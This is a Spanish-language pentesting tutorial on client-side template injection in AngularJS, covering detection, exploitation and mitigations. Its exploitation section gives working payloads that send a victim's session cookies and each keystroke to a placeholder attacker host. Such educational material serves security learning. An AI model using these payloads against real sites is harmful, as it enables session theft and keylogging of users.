# 🗞️ Client-Side Template Injection (CSTI)

CSTI es la variante del lado del cliente de SSTI. En lugar de inyectar código en una plantilla que procesa el servidor, el atacante inyecta código en una plantilla que procesa el **navegador del usuario**. Frameworks de frontend como AngularJS evalúan expresiones en el DOM, lo que crea esta superficie de ataque.

La diferencia clave con SSTI:

| Aspecto | SSTI | CSTI |
|---|---|---|
| Dónde se ejecuta | Servidor | Navegador del usuario |
| Impacto directo | RCE en servidor | Código JavaScript en el cliente |
| Derivación típica | Acceso al sistema | XSS / robo de sesión |

---

## Detección

El payload de detección es el mismo que en SSTI:

```
{{7*7}}
```

Si el campo refleja `49` en lugar del texto literal, el framework de frontend está evaluando la expresión — hay una vulnerabilidad CSTI.

Esto puede ocurrir en campos de búsqueda, mensajes de error personalizados, formularios de perfil, o cualquier campo cuyo valor se muestre de vuelta en la página usando un framework como AngularJS.

---

## Explotación — AngularJS

AngularJS es el framework más frecuentemente asociado a CSTI. Sus expresiones se evalúan dentro de `{{ }}` en el contexto del `$scope`.

### Ejecución de JavaScript básica

```javascript
{{constructor.constructor('alert(1)')()}}
```

### Robo de cookies (derivación a XSS)

```javascript
{{constructor.constructor('var img=new Image();img.src="http://<IP_ATACANTE>/?c="+document.cookie')()}}
```

### Keylogger

```javascript
{{constructor.constructor('document.onkeypress=function(e){var i=new Image();i.src="http://<IP_ATACANTE>/?k="+e.key}')()}}
```

---

## Relación con XSS

La derivación más común de CSTI es conseguir **XSS** efectivo. Una vez que el atacante puede ejecutar JavaScript arbitrario en el contexto de la víctima, puede:

- Robar cookies de sesión (si no tienen `HttpOnly`)
- Registrar teclas pulsadas
- Redirigir a páginas de phishing
- Realizar acciones en la aplicación en nombre de la víctima
- Exfiltrar datos visibles en el DOM

---

## Payloads adicionales por framework

La referencia de payloads por versión de AngularJS y otros frameworks:
- [HackTricks — CSTI](https://book.hacktricks.wiki/en/pentesting-web/client-side-template-injection-csti/)
- [PayloadsAllTheThings — CSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Client%20Side%20Template%20Injection)

---

## Mitigaciones

- Evitar el uso de `ng-bind-html` o equivalentes con input del usuario sin sanitizar
- Usar la política de Content Security Policy (CSP) para restringir la ejecución de scripts inline
- En AngularJS: usar el modo `strict` y evitar expresiones dinámicas con datos del usuario
- Validar y escapar todo input antes de insertarlo en el DOM
- Migrar a frameworks modernos que no usan evaluación de expresiones en el DOM de esta forma (Angular 2+, React, Vue)
